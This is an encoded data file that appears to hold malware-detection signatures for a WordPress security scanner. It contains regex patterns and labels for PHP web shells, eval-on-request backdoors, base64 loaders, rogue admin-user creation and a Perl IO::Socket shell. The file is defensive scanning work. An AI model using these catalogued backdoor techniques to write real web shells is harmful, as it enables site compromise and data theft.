hcJF8oR=V8UE9TfFJFUVVFUylUW1wpXStbO1=qL2kiO31zOjQyOiJpZiBpc3NldCBSRVFVRVNUIGV2YWwgb3IgZmlsZV9wdXRfY29udGVudHMiO2E6Mjp7aTowO3M6NToiSDFHQ2ciO2k6MTtzOjM3MToiLzxcP1twaFxzXSsoZnVuY3Rpb24gKFthLXpfMC=5XSspXChbXlx7XStbXHtcc1=rLityZXR1cm5bXjtdKjtbfVxzXSspP2lmW1xzXChdK2lzc2V=W1xzXChdK1wkXyhSRVFVRVN8R=V8UE9TKVQoXHMqXFtbXlxdXStcXSkrW1wpXHNce1=rKFwkW2Etel9cLTAtOV=rXHMqPVxzKi4rPztccyopKigoKGhlYWRlcnx1bmxpbmspXChbXjtdK1s7XHNdKyl7Mix9W1x9XHNdKmVsc2VbXHtcc1=rKFwkW2Etel9cLTAtOV=rXHMqPVxzKi4rPztccyopKigoXCRbYS16X1wtMC=5XStccyo9XHMqKT9cQD8oZXZhbHxcMilcKC4rP1wpO1xzKil7Mix9fGZpbGVfcHV=X2NvbnRlbnRzXChbXixdKyxccypiYXNlNjRfZGVjb2RlXCguKz9cKTspW1x9XHNdKihcPz58JCkvaXMiO31zOjIzOiJpZiBmb3IgdW5zZXQgd3Bfd3AgZm9ybSI7YToyOntpOjA7czo1OiJFOEdCUCI7aToxO3M6MTI=OiIvKFwkd3BbX1=rd3BbIFx=XSo9W147XSs7W1xyXG4gXHRdKikqKGlmfGZvcnx1bnNldClbIFx=XSpcKFwkd3BbX1=rd3BbXjtdKzsuKz9cPz48Zm9ybS4rP25hbWU9WyciXXdwW19dK3dwWyciXS4rPzxcL2Zvcm=-L2lzIjt9czoyODoiYXNzZXJ=IEhleCA2NGVuY29kZWRUZXh=IEhleCI7YToyOntpOjA7czo1OiJGNTJERSI7aToxO3M6Mjk=OiIvKGFzc2VydF9vcHRpb25zXCguKz9cKTtccyp8ZnVuY3Rpb24gW2Etel8wLTldK1woW15cKV=qW1wpXHNce1=rLis_cmV=dXJuW147XSpbO1x9XHNdK3xcJChjb2xvcnxhdXRofHBhc3N8ZGVmYXVsdHxfXylbX1wtXD5cLmEtejAtOV=qXHMqPS4rPztccyopKigoKFwkW2Etel8wLTldKylccyo9Lio_XCRcMnwoXCRbYS16XzAtOV=rKVxzKj=uKj9cNSkuKlxzKikqYXNzZXJ=XChccyooIihcXHhbMC=5QS1GXVswLTlBLUZdKSsnW1wvYS16XF8wLTlcPV=rJyhcXHhbMC=5QS1GXVswLTlBLUZdKSsifFw2KVtcKVxzXSs7L2kiO31zOjI=OiJ3ZWIgc2hlbGwgZm9wZW4gcGFzc3RocnUiO2E6Mjp7aTowO3M6NToiRTI2NHEiO2k6MTtzOjY5OiIvXi4rP2Vycm9yX3JlcG9ydGluZ1woLis_d2ViWyBcdF=qc2hlbGwuKz9mb3BlblwoLis_cGFzc3RocnVcKC4rPyQvaXMiO31zOjU3OiJwaHAgaWYgaXNfZGlyIGZpbGVfZ2V=X2NvbnRlbnRzIGlmIGZpbGVfcHV=X2NvbnRlbnRzIGVjaG8iO2E6Mjp7aTowO3M6NToiRzdEMFciO2k6MTtzOjM=NToiLzxcP1twaFxzXSsoXC9cL1teXG5dKltcclxuXSt8XCRbYS16XzAtOV=rXHMqPVteO1=qO1xzKnxlcnJvcl9yZXBvcnRpbmdcKFteO1=rO1xzKikrLis_KGluY2x1ZGVbXjtdKndwLWNsYXNzLWhlYWRlcnMucGhwLis_fGlmW1woXHNdK2lzX2RpclteXHtdK1x7KFxzKlwkW2Etel8wLTldK1xzKj1maWxlX3xbXlx9XStcfVxzKilnZXRfKGFsbF9kaXJzXCguKz98Y29udGVudHNcKFteO1=qO1xzKlwkW2Etel8wLTldK1xzKj1bXjtdKjtccyooaWZbXChcc1=rKT8pKWZpbGVfcHV=X2NvbnRlbnRzXCguKz8oKHRvdWNoXCguK3xlY2hvW147XSo7XHMqfFx9KFxzKmVsc2VbXHNce1=rKT8pXHMqKSsoJHxcPz4pL2lzIjt9czo1MzoidmFyIGZ1bmN=aW9ucyByZXR1cm4gbmV3IFJlY3Vyc2l2ZUFycmF5SXRlcmF=b3IgYXJyYXkiO2E6Mjp7aTowO3M6NToiRTI2NmMiO2k6MTtzOjE5MToiLyhcJFthLXpcXzAtOV=rW1x=ID1dKyJbYS16XF9cLVxcMC=5XSoiO1tcclxuIFx=XSopKygoXCRbYS16XF8wLTldK1tcdCA9XSspP1wkW2EtelxfMC=5XStcKCsuKz9bXCldKztbXHJcbiBcdF=qKSsuK3JldHVyblsgXHRdK25ld1sgXHRdK1JlY3Vyc2l2ZUFycmF5SXRlcmF=b3JbXCggXHRdK2FycmF5Lis_W1wpIFx=XSs7W1x9XSsvaXMiO31zOjc2OiJkaXNwbGF5X2Vycm9ycyBmaWxlX2dldF9jb25=ZW5=cyBfUkVRVUVTVCBmaWxlbmFtZSB1cGRhdGVfY29kZSBmd3JpdGUgdW5saW5rIjthOjI6e2k6MDtzOjU6Ikc4TUo=IjtpOjE7czoxNTM6Ii9eLis_KGVycm9yX3JlcG9ydGluZ1woMFwpfGRpc3BsYXlfZXJyb3JzKS4rPyhmaWxlX2dldF9jb25=ZW5=c1woW147XSp8dXJsZGVjb2RlXCgpXCRfKFBPfFJFUVVFKVNUXFtbIiddZltpbGVdKm5hbWVbc1=_WyInXVxdLis_ZndyaXRlXCguKz91bmxpbmtcKC4rJC9pcyI7fXM6NTE6ImRpc3BsYXlfZXJyb3JzIGNyZWF=ZV93cF91c2VyIFJFUVVFU1QgZndyaXRlIHVubGluayI7YToyOntpOjA7czo1OiJFMkY5YiI7aToxO3M6Nzk6Ii9eLis_ZGlzcGxheV9lcnJvcnMuKz9jcmVhdGVfd3BfdXNlclwoXCRfUkVRVUVTVFxbLis_ZndyaXRlXCguKz91bmxpbmtcKC4rPyQvaXMiO31zOjE3OiJwaHAgY2xhc3MgdmlhV29ybSI7YToyOntpOjA7czo1OiJGNzRFZSI7aToxO3M6MjUyOiIvPFw_W3BoXHNdKyhcL1wqLio_XCpcL1xzKikqKGNsYXNzIHZpYVdvcm1ccypcey4rP2Z3cml=ZVwoLis_ZmlsZV9nZXRfY29udGVudHNcKC4rP3VubGlua1woLis_YmFzZTY=X2VuY29kZVwoLis_KT9maWxlX3B1dF9jb25=ZW5=c1woW14sXSssXHMqYmFzZTY=X2RlY29kZVwoKFxAP2ZpbGVfZ2V=X2NvbnRlbnRzXCguK3xbXlwpXStbXCk7XHNdK2VjaG9bXHNcKF=rZmlsZV9nZXRfY29udGVudHNcKFteXCldK1tcKTtcc1=rKCR8XD8-KSkvaXMiO31zOjQyOiJpZiBpc3NldCBSRVFVRVNUIEZJTEUgc3RyaXBzbGFzaGVzIFJFUVVFU1QiO2E6Mjp7aTowO3M6NToiRzY4QzMiO2k6MTtzOjI4MjoiL2lmW1xzXChdK2lzc2V=W1xzXChdK1wkXyhHRXxQT1N8UkVRVUVTKVQoXHMqXFtbXlxdXSpcXSt8XHMqXHtbXlx9XSpcfSspK1tcc1wpXHtdKygoXCRbYS16XzAtOV=rKVxzKj1ccypcJF8oR=V8UE9TfFJFUVVFUylUKFxzKlxbW15cXV=qXF=rfFxzKlx7W15cfV=qXH=rKStbXjtdKls7XHNdKikqKGFzc2VydHxldmFsfFwkW2Etel8wLTldKylccypcKCtzdHJpcHNsYXNoZXNcKFwkXyhHRXxQT1N8UkVRVUVTKVQoXHMqXFtbXlxdXSpcXSt8XHMqXHtbXlx9XSpcfSspK1tcc1wpXSs7W1x9XHNdKi9pIjt9czo4MToiZXJyb3JfcmVwb3J=aW5nIGV2YWwgY3VybF9pbml=IGZpbGVfZ2V=X2NvbnRlbnRzIGZpbGVfcHV=X2NvbnRlbnRzIGluY2x1ZGUgdW5saW5rIjthOjI6e2k6MDtzOjU6IkU1RURaIjtpOjE7czoyMDE6Ii9cJFthLXpcXzAtOV=rWz1cc1=rX19GSUxFX187XHMqXCRbYS16XF8wLTldK1tccz1dW147XXsyMDAwfS4qP2Vycm9yX3JlcG9ydGluZ1woLis_ZXZhbFwoLis_KGN1cmxfaW5pdHxmaWxlX2dldF9jb25=ZW5=cykuKz9maWxlX3B1dF9jb25=ZW5=c1woLis_aW5jbHVkZS4qP3VubGlua1woLio_XCk7XHMqXH1ccyplbHNlXHMqXHtbXlx9XStbXH1dKy9pcyI7fXM6NTY6ImlmIGlzc2V=IFBPU1QgZmlsZV9nZXRfY29udGVudHMgZm9wZW4gZndyaXRlIGZjbG9zZSBleGl=IjthOjI6e2k6MDtzOjU6IkU1SU5vIjtpOjE7czoyOTI6Ii8oXCRhdXRoX3Bhc3NbPVxzXSsuKz8pPyhpZltcc1=qXChbXHNdKmlzc2V=W1xzXSpcKFtcc1=qXCRfKFJFUVVFU3xHRXxQT1MpVFxbLis_ZmlsZV9nZXRfY29udGVudHNcKF9fRklMRV9fLis_Zm9wZW5cKC4rP2Z3cml=ZVwoLio_ZmNsb3NlXCguKj9leGl=O1tcc1x9XSopKyhpZltcc1=qXChbXHNdKmlzc2V=W1xzXSpcKFtcc1=qXCRfKFJFUVVFU3xHRXxQT1MpVFxbW15ce1=rW1xzXHtdK2lmW1xzXSpcKFtcc1=qZmlsZV9leGlzdHNbXHNdKlwoW15ce1=rW1xzXHtdK1teXH1dK1tcfV1bXlx9XSpbXH1dKT8vaXMiO31zOjYwOiJwYXRoIGlmIGZpbGVfZXhpc3RzIGlzX3dyaXRhYmxlIGlmIGZ1bmN=aW9uX2V4aXN=cyBXcml=ZURhdGEiO2E6Mjp7aTowO3M6NToiRTVGQ3YiO2k6MTtzOjEzOToiL1wkcGF=aFs9XHNdKy4rW1xzXSppZltcc1=qXChcIWZpbGVfZXhpc3RzXCguKz9pc193cml=YWJsZVwoW15cKV=qW1wpXHNce1=raWZbXHNdKlwoZnVuY3Rpb25fZXhpc3RzXCguKz9Xcml=ZURhdGEuKz9Xcml=ZURhdGFcKFwpO1tcc1x9XSsvaSI7fXM6NTI6ImF1dGhfcGFzcyBjb3B5IEZJTEVTIGV4ZWMgcGFzc3RocnUgc3lzdGVtIHNoZWxsX2V4ZWMiO2E6Mjp7aTowO3M6NToiRjRESDEiO2k6MTtzOjEyMToiLzxcPyg_PS4qXCQobWQ1fGF1dGgpX3Bhc3Nccyo9KSg_PS4qY29weVwoXCRfKFBPU1R8RklMRVMpXFspKD89LipleGVjXCgpKD89LipwYXNzdGhydSkoPz=uKnN5c3RlbSkoPz=uKnNoZWxsX2V4ZWNcKCkuKy9pcyI7fXM6ODg6InBocCBzZXRfdGltZV9saW1pdCBmaWxlX2dldF9jb25=ZW5=cyBSRVFVRVNUIGZpbGVfZ2V=X2NvbnRlbnRzIEZJTEVTIGZvcGVuIFJFUVVFU1Rmd3JpdGUiO2E6Mjp7aTowO3M6NToiRTVJTkEiO2k6MTtzOjE1NDoiLzxcPyhwaHApPy4rP3NldF9=aW1lX2xpbWl=XCguKz9maWxlX2dldF9jb25=ZW5=c1woXCRfKFJFUVVFU3xHRXxQT1MpVC4rP2ZpbGVfZ2V=X2NvbnRlbnRzXChcJF9GSUxFU1xbLis_Zm9wZW5cKFwkXyhSRVFVRVN8R=V8UE9TKVQuKz9md3JpdGVcKC4rPyhcP1w-KS9pcyI7fXM6MTQwOiJlcnJvcl9yZXBvcnRpbmcgZnVuY3Rpb24gZXJyb3JfNDA=IHR=cF9yZXF1ZXN=X2N1c3RvbSBnZXRJcCBnZXRVc2VyYWdlbnQgY29udmVydElwVG9TdHJpbmcgaHR=cF9idWlsZF9xdWVyeSBmaWxlX2dldF9jb25=ZW5=cyBmd3JpdGUgbG9uZzJpcCI7YToyOntpOjA7czo1OiJGN1Y5aCI7aToxO3M6MjEyOiIvPFw_Lis_ZXJyb3JfcmVwb3J=aW5nXCgoPz=uKz9nZXRbX1=qSXBcKCkoPz=uKz9mdW5jdGlvbiBlcnJvcl8=MDRcKCkoKD89Lis_c3RyZWFtX2NvbnRleHRfY3JlYXRlXCgpfCg_PS4rP3JlcXVlc3RfY3VzdG9tXCgpKSg_PS4rP2h=dHBfYnVpbGRfcXVlcnlcKCkoPz=uKz9maWxlX2dldF9jb25=ZW5=c1woKSg_PS4rP2hlYWRlclwoKSg_PS4rP2xvbmcyaXBcKCkuKy9pcyI7fXM6NDU6ImlmIGZ1bmN=aW9uX2V4aXN=cyBmdW5jdGlvbiB2YXJpYWJsZSBmdW5jdGlvbiI7YToyOntpOjA7czo1OiJHMzlLRiI7aToxO3M6MzEyOiIvKFwvXCpbXlwqXSooXCpbXlwqXC9dKikrXC9ccyopKihcJFthLXpfMC=5XSsoXHMqXFtbXlxdXStcXSspKltcLlxzXSo9W147XSs7XHMqKSppZltcKFxzXCFdK2Z1bmN=aW9uX2V4aXN=c1tcKFxzXSsoWyciXSkoLis_KVw1W1wpXHNdK1x7XHMqZnVuY3Rpb25ccypcNlxzKlwoLis_cmV=dXJuLio_O1tcc1x9XSsoKFwkW2Etel8wLTldKylccyo9XHMqKGNyZWF=ZV9mdW5jdGlvblxzKlwoW14sXSssXHMqKT9cNlwoW147XStbO1x9XHNdKykrKFxzKihcJFthLXpfMC=5XStccyo9XHMqKT9cJFthLXpfMC=5XStcKFteO1=rWyInXCk7XH1cc1=rKSsvaXMiO31zOjQ2OiJwZXJsIHVzZSBJTzo6U29ja2V=IHNjYW5fZGlyIHVuYW1lIHN5c3RlbSBleGVjIjthOjI6e2k6MDtzOjU6IkU4UzdlIjtpOjE7czo3NDoiL1wjXCFcL3VzclwvYmluXC9wZXJsLis_c2Nhbl9kaXJcKC4rP3VuYW1lXCguKz9zeXN=ZW1cKC4rP2ZpbGVtYW5hZ2VyLisvaXMiO31zOjYxOiJmdW5jdGlvbiBYX2lwIFhfbWFjcm9zIGVycm9yXzQwNCBodHRwX3JlcXVlc3QgZndyaXRlIEZVTkNUSU9OIjthOjI6e2k6MDtzOjU6IkU5SDk1IjtpOjE7czoxMTY6Ii9cPFw_Lis_X2lwXCgoLis_ZnVuY3Rpb24gW2EtejAtOV=rX21hY3Jvc1woKXs=fS4rP2Z1bmN=aW9uIGVycm9yXzQwNFwoLis_aHR=cF9yZXF1ZXN=Lis_ZndyaXRlXCguKz9fX=ZVTkNUSU9OX18uKy9zIjt9czozMToiaWYgaXNzZXQgZXZhbCBWYXJpYWJsZSBmdW5jdGlvbiI7YToyOntpOjA7czo1OiJHNENFRCI7aToxO3M6MjU3OiIvKFxAP3RvdWNoXCguKlwpKztccyopKihcJFthLXpfMC=5XHtcJFx9XSsoXHMqXFtbXlxdXStcXSkqXHMqPVteO1=rO1xzKikqaWZbXHNcKFwhXStpc3NldFtcc1woXStcJFthLXpfMC=5XHtcJFx9XSsoXHMqXFtbXlxdXStcXSkqW1wpXHNce1=rLio_XHMqKFwkW2Etel8wLTlce1wkXH1dKyhccypcW1teXF1dK1xdKSpccyo9XHMqKT9cQD9ldmFsXCguKj9cJFthLXpfMC=5XHtcJFx9XSsoXHMqXFtbXlxdXStcXSkqXHMqXCguKj9cKSs7WztcfVxzXSovaSI7fXM6NTc6ImVycm9yX3JlcG9ydGluZyBleGVjIHN5c3RlbSBwYXNzdGhydSBmb3BlbiBSRVFVRVNUIGZ3cml=ZSI7YToyOntpOjA7czo1OiJGNDc1NSI7aToxO3M6MjM2OiIvPFw_Lis_KHNldF9=aW1lX2xpbWl=XCgwfGVycm9yX3JlcG9ydGluZ1woMHxleHBsb2RlXChbJyJdd3AtY29udGVudCkoPz=uKz91bmxpbmtccypcKCkoPz=uKz9wYXNzdGhydVxzKlwoKSg_PS4rP3N5c3RlbVxzKlwoKSg_PS4rP2V4ZWNccypcKCkoKD89Lis_Y3VybF9pbml=XHMqXCgpKD89Lis_ZmlsZV9nZXRfY29udGVudHNccypcKCl8KD89Lis_cmVhZGRpclxzKlwoKSkoPz=uKz9md3JpdGVccypcKCkuKy9pcyI7fXM6ODc6ImluaV9zZXQgb2Jfc3RhcnQgcmVnaXN=ZXJfc2h1dGRvd25fZnVuY3Rpb24gaWYgSFRUUF9VU=VSX=FHRU5UIGZpbGVfZ2V=X2NvbnRlbnRzIHJldHVybiI7YToyOntpOjA7czo1OiJGNUs3aiI7aToxO3M6Mjc2OiIvXEA_aW5pX3NldFwoLitccysoXEA_b2Jfc3RhcnRcKFsiJ1=oLis_KVsnIl1cKTtccytcQD9yZWdpc3Rlcl9zaHV=ZG93bl9mdW5jdGlvblwoLitccysoZnVuY3Rpb24gXDJcKFwkW2EtelxfMC=5XStbXClcc1x7XStpZi4rP=hUVFBfVVNFUl9BR=VOVC4rW1wpXHNce1=rLis_ZmlsZV9nZXRfY29udGVudHMuK1xzKnJldHVyblteO1=qO1tcc1x9XSspP3woXCRbYS16XF8wLTldKylccyo9XHMqYmFzZTY=X2RlY29kZVwoLitccyplY2hvLis_ZmlsZV9nZXRfY29udGVudHNcKFw=LispL2kiO31zOjM4OiJpZiBDT=9LSUUgZ3ppbmZsYXRlIGJhc2U2NF9kZWNvZGUgZXZhbCI7YToyOntpOjA7czo1OiJGNExEOCI7aToxO3M6MjQ3OiIvaWZccypcKC4rP1woXCRfQ=9PS=lFLis_W1x7XHNdKihcJFthLXpfMC=5XSspXHMqPS4qP2Jhc2U2NF9kZWNvZGVcKCguKz9ldmFsXChcMVwpLit8W147XStbO1xzXSsoXCRbYS16XzAtOV=rKVxzKj1bXjtdK1s7XHNdKyhmaWxlX3B1dF9jb25=ZW5=c1woXDMuKz9cMVteO1=rWztcc1=rfGVjaG9bXChcc1=rWyciXVxceC4rP1snIl1bXCk7XHNdKyhpbmNsdWRlfHVubGluaylbXChcc1=rXDNbXCk7XHNdKyl7Myx9LispW1xzXH1dKi9pIjt9czoyMToiaWYgaXNzZXQgUkVRVUVTVCBldmFsIjthOjI6e2k6MDtzOjU6IkcxSDhSIjtpOjE7czoyNzI6Ii8oKFwkW19hLXowLTldK1xzKj1bXjtdKztccyopKmlmW1xzXChdK2lzc2V=W1woXHNdK1wkXyhSRVFVRVN8R=V8UE9TKVRcW1teXF1dK1xdW1wpXHNdK1x7XHMqKFwkW19cLmEtejAtOV=rWz1cc1=rXCRfKFJFUVVFU3xHRXxQT1MpVFxbW15cXV=rXF1bO1xzXSspKygoXCRbX2EtejAtOV=rWz1cc1=rKT8oZXZhbHxmaWxlX3B1dF9jb25=ZW5=c3xmb3Blbnxmd3JpdGV8ZmNsb3NlKVwoW15cKV=rXCk7XHMqKSsoKGVjaG98ZXhpdClbXlw7XSo7XHMqKSpcfVxzKihlbHNlKT8pKy9pIjt9czozNToiaWYgaXNzZXQgYmFzZTY=X2RlY29kZSBSRVFVRVNUIGV2YWwiO2E6Mjp7aTowO3M6NToiRjRTRFYiO2k6MTtzOjMwODoiLzxcP1twaFxzXSsoKFxAPyhpZ25vcmVfdXNlcl9hYm9ydHxzZXRfdGltZV9saW1pdClcKHxcJFtfXC5hLXowLTldK1xzKj=pW147XStbO1xzXSspKmlmW1woXHNcIV=rKGlzc2V=fGVtcHR5KVtcKFxzXStcJF8oUkVRVUVTfEdFfFBPUylUXFsuK1tcc1x7XSsoXCRbX1wuYS16MC=5XSspXHMqPVxzKihiYXNlNjRfZGVjb2RlfFwkW2Etel8wLTldKylccypcKCtccypcJF8oUkVRVUVTfEdFfFBPUylUXFtbXlxdXStcXVtcKTtcc1=rXEA_ZXZhbFwoXDZcKTtccypcfShccyplbHNlW1xzXHtdK2VjaG8gIlteIl=qWyI7XHNcfV=rKT8oJHxcPz4pL2kiO31zOjU2OiJzZXRfdGltZV9saW1pdCB1bmxpbmsgYmFzZTY=X2RlY29kZSBmd3JpdGUgZXhlYyBwYXNzdGhydSI7YToyOntpOjA7czo1OiJFOVA3MyI7aToxO3M6OTk6Ii88XD8ocGhwKT8uKz9zZXRfdGltZV9saW1pdFwoMFwpLis_dW5saW5rXCguKz9iYXNlNjRfZGVjb2RlXCguKz9md3JpdGVcKC4rP2V4ZWNcKC4rP3Bhc3N=aHJ1XCguKy9pcyI7fXM6MzQ6Im1vdmVfdXBsb2FkZWRfZmlsZSBfRklMRVMgX19GSUxFX18iO2E6Mjp7aTowO3M6NToiSDE4R2YiO2k6MTtzOjI2MDoiLzxcP1twaFxzXSsoKFwkW2Etel8wLTldKylccyo9XHMqXCRfRklMRVNcW1teO1=rO1xzKihcJFthLXpfMC=5XSspXHMqPVteO1=rO1xzKmlmW1xzXChdK2ZpbGVfZXhpc3RzW1xzXCgnIlwuXC9dK1wzW1xzXCgnIlwpXHNdK3VubGlua1tcc1woJyJcLlwvKV=rXDMpPy4qPyhtb3ZlX3VwbG9hZGVkX2ZpbGVbXHNcKF=rKFwkX=ZJTEVTXFtbXixdK1ssXHNdK19fRklMRV9ffFwyKXxzeXN=ZW1cKFsnIl1tdiBbJyJdXC5cJF9GSUxFU1xbKS4qPygkfFw_PikvaXMiO31zOjU4OiJwaHAgaWYgaXNzZXQgUkVRVUVTVCBldmFsIGZpbGVfcHV=X2NvbnRlbnRzIGluY2x1ZGUgdW5saW5rIjthOjI6e2k6MDtzOjU6IkczVkxzIjtpOjE7czo1MDA6Ii88XD9bcGhcc1=rKFxAPyhpZ25vcmVfdXNlcl9hYm9ydHxzZXRfdGltZV9saW1pdHxlcnJvcl9yZXBvcnRpbmcpXCguKj9cKTtccyopKihcJFthLXpfMC=5XStccyo9Lis_O1xzKikqKHRyeVxzKnxpZltcc1woXCFdKyhlbXB=eXxzdHJsZW58aXNzZXQpXChcJF8oUkVRVUVTfEdFfFBPUylUW15ce1=rKVx7Lio_KFwkW2Etel8wLTldKylccyo9Lis_ZXZhbFwoXDdcKS4rP2ZpbGVfLi5=X2NvbnRlbnRzW1woIF=rKFtcJGEtel8wLTlcWyciXF1cLl=rKS4rPyhwcmVnX21hdGNoX2FsbFwoW14sXSssW14sXSssXHMqKFwkW2Etel8wLTldKylbXCk7XHNdK2VjaG9bIFwoXStcOHxpbmNsdWRlKF9vbmNlKT9bXChcc1=rXDguKz91bmxpbmtbXChcc1=rXDh8Y3VybF9pbml=XCguKz9jdXJsX3NldG9wdFwoW14sXSssXHMqQ1VSTE9QVF9VUkxbLFxzXStcOHxcfVxzKmNhdGNoXHMqXChccypFeGNlcHRpb25ccypcJFthLXpfMC=5XStbXClcc1=qXHtbXlx9XSpcfVxzKikuKj8oXD8-fCQpL2lzIjt9czo=MzoicGhwIGNoZGlyIFJFUVVFU1QgZ2V=Y3dkIG1vdmVfdXBsb2FkZWRfZmlsZSI7YToyOntpOjA7czo1OiJHNk5CRCI7aToxO3M6MTk5OiIvPFw_W3BoXSouKz8oY2hkaXJbXChcc1=rXCRfKFJFUVVFU3xQT1N8R=UpVFxbfGVycm9yX3JlcG9ydGluZ1woMC4rP1tnc11ldF9tYWdpY19xdW9=ZXMuKz9oYWNrZVtyZF=pLis_KFwkW2Etel8wLTldKylbPVxzXEBdK2dldGN3ZFwoLis_KGNvcHl8bW92ZV91cGxvYWRlZF9maWxlKVwoXCRfRklMRVNcW1teLF=rWyxcc1=rXDMuKz8oXD8-fCQpL2lzIjt9czozNzoicGhwIGNyZWF=ZV9mdW5jdGlvbiBWYXJpYWJsZSBmdW5jdGlvbiI7YToyOntpOjA7czo1OiJIMUhBWiI7aToxO3M6MjM2OiIvPFw_W3BoXHNdKihcL1wqKFteXCpdKlwqW15cL1=pKlteXCpdKlwqXC9ccyp8XC9cLy4qXHMqKSooKFwkW2Etel9cLTAtOV=rKVxzKj=uKztccyp8aWZccypcKFteXHtdK1x7XHMqKSsoKFwkW2Etel9cLTAtOV=rKVxzKj1ccyopP2NyZWF=ZV9mdW5jdGlvblwoW14sXSssXHMqKFw=W147XSs7W1xzXEBdKlw2XCh8IihcXChbMC=5XXsyLDN9fHhbMC=5YS1mXXsyfSkpKyIpW15cKV=qW1wpO1xzXH1dKygkfFw_PikvaSI7fXM6NDg6InBocCBhcnJheSBmb3JlYWNoIGFycmF5IGV2YWwgQXJyYXkgRnVuY3Rpb24gUE9TVCI7YToyOntpOjA7czo1OiJFQVVOcCI7aToxO3M6MTIxOiIvPFw_W3BoXSpccysoXCRbYS16XC1cXzAtOV=rKVs9XHNdK2FycmF5XChbXjtdKztccypmb3JlYWNoW1xzXChdK1wxLis_ZXZhbFtcc1woXStcMVxbW15cXV=rXF=rW1woXHNdK1wkX1BPU1RcW1wxLis_XD8-L2lzIjt9czo3NzoiZndyaXRlIHVubGluayBldmFsIGNobW9kIFBPU1QgcGhwaW5mbyBtb3ZlX3VwbG9hZGVkX2ZpbGUgZXhlYyBzeXN=ZW=gcGFzc3RocnUiO2E6Mjp7aTowO3M6NToiRUI3RXQiO2k6MTtzOjE1MzoiLzxcPy4rP2Vycm9yX3JlcG9ydGluZ1woMFwpLis_ZndyaXRlXCguKz91bmxpbmtcKC4rP2V2YWxcKC4rP2NobW9kXChcJF9QT1NUXFsuKz9waHBpbmZvXCguKz9tb3ZlX3VwbG9hZGVkX2ZpbGVcKCguKz8oZXhlY1wofHN5c3RlbVwofHBhc3N=aHJ1XCgpKXszfS4rL2lzIjt9czoyOToicG9zdCBzdHJ=b3VwcGVyIGlmIGlzc2V=IGV2YWwiO2E6Mjp7aTowO3M6NToiRkIzQmUiO2k6MTtzOjE4NzoiLygoXCRbYS16XzAtOV=rKVxzKj1bXjtdKztccyopKyhcJFtfYS16MC=5XStccyo9XHMqKFwkW2Etel8wLTldK3xzdHJ=by4uLmVyKVxzKlwoKFtcc1wuXSpcJFthLXpfMC=5XStccypcW1xkK1xdKStbXCk7XHNdKykraWZbXChcc1=raXNzZXRccypcKFteXCldK1tcKVxzXStce1xzKmV2YWxccypcKFteXCldK1tcKTtcc1=rXH=vaSI7fXM6MzQ6ImlmIGlzc2V=IFJFUVVFU1QgVmFyaWFibGUgRnVuY3Rpb24iO2E6Mjp7aTowO3M6NToiRzlSTm8iO2k6MTtzOjI=NDoiL2lmW1xzXChcIV=rKGlzc2V=fGVtcHR5KVtcc1woXStcJF8oUkVRVUVTVHxHRVR8UE9TVHxDT=9LSUUpLitbXHtcc1=qKFwkW2Etel8wLTlce1x9XStccyo9XHMqKCdbXiddKid8IlteIl=qInxcJClbXjtdKlsnIjtcKVxzXSopKihcJFthLXpfMC=5XStccyo9XHMqKT9cQD8oXCQoPyFkZWxldGVfc2VydmljZSlbYS16XzAtOV=rKShccypcW1teXF1dKlxdKSpzKlwoLio_W1wpXSs7W1x9XHNdKihlbHNlXHMqXHtbXn1dK1x9KT8vaSI7fXM6NjU6ImlmIGFycmF5X2tleXMgR=VUIGZpbGVfZ2V=X2NvbnRlbnRzIGlmIHVubGluayBmb3BlbiBmd3JpdGUgZmNsb3NlIjthOjI6e2k6MDtzOjU6Ikc2QkMwIjtpOjE7czoyOTM6Ii8oXEA_KGlnbm9yZV91c2VyX2Fib3J=fGluaV9zZXR8c2V=X3RpbWVfbGltaXR8ZXJyb3JfcmVwb3J=aW5nKVwoLio_XCk7XHMqfFwkW2Etel8wLTldK1xzKj1bXjtdKztccyopKigoKGlmXHMqXCh8ZWxzZSlbXlx7XSpce1xzKik_ZnVuY3Rpb25ccysuKz9yZXR1cm5bXjtdKjtbXHNcfV=rKSsoKFwkW2Etel8wLTldK1xzKj1ccyopP1wkW2Etel8wLTldK1woW147XStbIidcKTtcfVxzXSopKy4rPyhmKG9wZW58d3JpdGV8Y2xvc2UpXCguKz8pezMsfWluY2x1ZGVcKC4qP1wpO1xzKnVubGlua1woLio_XCk7XHMqL2lzIjt9czo=MToiaWYgYXJyYXlfa2V5cyBHRVQgZXZhbCBiYXNlNjRfZGVjb2RlIGV4aXQiO2E6Mjp7aTowO3M6NToiRUNGRkYiO2k6MTtzOjIxOToiLzxcP1twaFxzXSooXEA_ZXJyb3JfcmVwb3J=aW5nXCgwXCk7XHMqKT9pZltcKFxzXSthcnJheV9rZXlzXChcJF9HRVQuK1xzKygoPFw_W3BoXHNdKik_XCRbYS16XF8wLTldK1tcc1x7XCRdK1xAP2V2YWxcKGJhc2U2NF9kZWNvZGVcKFsnIl1bYS16XF9cL1wrXD=wLTldK1snIl1bXClcfVx7XCRcc1=rZXhpdFwoW1wpXH1cc1=rXCZccypcJFthLXpcXzAtOV=rWztcc1x9XStcPz4pKy9pIjt9czozOToiYmFzZTY=X2RlY29kZSBmdW5jdGlvbiBjdXJsIHJldHVybiBleGl=IjthOjI6e2k6MDtzOjU6IkVDRkpWIjtpOjE7czoxOTg6Ii88XD9bcGhcc1=qKFwvXCouKz9cKlwvXHMqKSooXCRbYS16XF8wLTldK1xzKj1ccypiYXNlNjRfZGVjb2RlXChbXjtdK1tcKTtcc1=qKStmdW5jdGlvblxzKyhbYS16XF8wLTldKylccypcKFteXHtdK1tce1xzXSsoKFwkW2EtelxfMC=5XStbXHMqPV=rKT9jdXJsX1teO1=rO1xzKikrcmV=dXJuIC4rXDNcKC4rZXhpdDtbXH1cc1=rKCR8XD8-KS9pcyI7fXM6NDA6InBocCBpZiBpc3NldCBHRVQgZWNobyBpZiBQT1NUIGNvcHkgRklMRVMiO2E6Mjp7aTowO3M6NToiRzNJQ=wiO2k6MTtzOjU5MjoiLzxcP1twaFxzXSooZWNob1teO1=qO1xzKnxlcnJvcl9yZXBvcnRpbmdcKDBcKTtccyp8XC9cKi4qP1wqXC9ccyooXCRbYS16XzAtOV=rXHMqPVteO1=rO1xzKnxcL1wvW15cbl=qXHMqKSsoaWZbXHNcKF=raXNzZXRcKFwkXyhSRVFVRVN8R=V8UE9TKVRcW1teXF1dK1xdKVteXCldKltcKVxzXHtdKyhcJFthLXpfMC=5XStccyo9XHMqXCRfW2Etel8wLTldK1xbW15cXV=rXF=7XHMqKSsoXCRbYS16XzAtOV=rXHMqPVxzKlwkW2Etel8wLTldK1woW15cKV=rXCkrO1xzKikrLio_XDNbXlx7XStbX